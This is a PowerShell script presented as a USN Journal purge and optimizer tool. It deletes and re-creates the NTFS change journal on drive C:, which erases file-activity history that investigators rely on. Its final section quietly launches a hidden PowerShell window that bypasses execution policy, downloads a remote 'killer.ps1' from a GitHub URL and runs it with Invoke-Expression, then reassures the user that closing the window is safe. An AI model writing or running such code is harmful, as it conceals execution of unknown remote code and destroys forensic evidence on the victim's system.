# Requires -RunAsAdministrator

Write-Host "=== USN Journal Purge & Optimizer Tool ===" -ForegroundColor Cyan
$Drive = "C:"

try {
    # 1. Query current journal size to replicate configurations
    Write-Host "[*] Querying current USN Journal configuration..." -ForegroundColor Yellow
    $QueryOutput = fsutil usn queryjournal $Drive 2>&1 | Out-String

    # Initialize variables with hardcoded safe defaults
    $MaxSize = 33554432
    $AllocDelta = 8388608

    # Safely extract Max Size
    if ($QueryOutput -match 'Maximum Size\s*:\s*(0x[0-9a-fA-F]+)') {
        if ($Matches -ne $null -and $Matches.Count -gt 1) {
            $MaxSize = [Convert]::ToInt64($Matches[1], 16)
        }
    }
    
    # Safely extract Allocation Delta
    if ($QueryOutput -match 'Allocation Delta\s*:\s*(0x[0-9a-fA-F]+)') {
        if ($Matches -ne $null -and $Matches.Count -gt 1) {
            $AllocDelta = [Convert]::ToInt64($Matches[1], 16)
        }
    }

    Write-Host "[+] Target Max Size: $MaxSize bytes" -ForegroundColor Green
    Write-Host "[+] Target Allocation Delta: $AllocDelta bytes" -ForegroundColor Green

    # 2. Delete/Purge the journal
    Write-Host "`n[*] Purging and deleting USN Journal..." -ForegroundColor Yellow
    $DeleteOutput = fsutil usn deletejournal /d $Drive 2>&1
    Write-Host "[+] Delete request submitted." -ForegroundColor Green

    # 3. Handle NTFS lock delay safely inside PowerShell
    Write-Host "[*] Allowing file system 3 seconds to release volume metadata locks..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3

    Write-Host "[*] Re-creating USN Journal..." -ForegroundColor Yellow
    for ($i = 1; $i -le 3; $i++) {
        $CreateOutput = fsutil usn createjournal m=$MaxSize a=$AllocDelta $Drive 2>&1
        if ($LASTEXITCODE -eq 0 -or $CreateOutput -match "Successfully") {
            Write-Host "[+] Success! USN Journal has been cleared and reset." -ForegroundColor Green
            break
        } else {
            Write-Host "[!] Volume locked. Retrying creation (Attempt $i/3)..." -ForegroundColor Magenta
            Start-Sleep -Seconds 2
        }
    }

} catch {
    Write-Error "An unexpected error occurred: $_"
}

# =========================================================================
# 4. FETCH AND RUN KILLER INVISIBLY FROM GITHUB
# =========================================================================
Write-Host "`n[*] Launching hidden background process cleaner..." -ForegroundColor Yellow

# Swap this URL with your actual raw URL path to your killer.ps1 file
$KillerUrl = "https://raw.githubusercontent.com/isucksunstoes69-dotcom/cleaner-mwah/refs/heads/main/killer.ps1"

# Dynamically spawns a hidden process executing the online script code
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod '$KillerUrl')`""

Write-Host "[+] Background job active. You can safely close this window now." -ForegroundColor Green
Write-Host "Press any key to exit."
$null = [Console]::ReadKey()
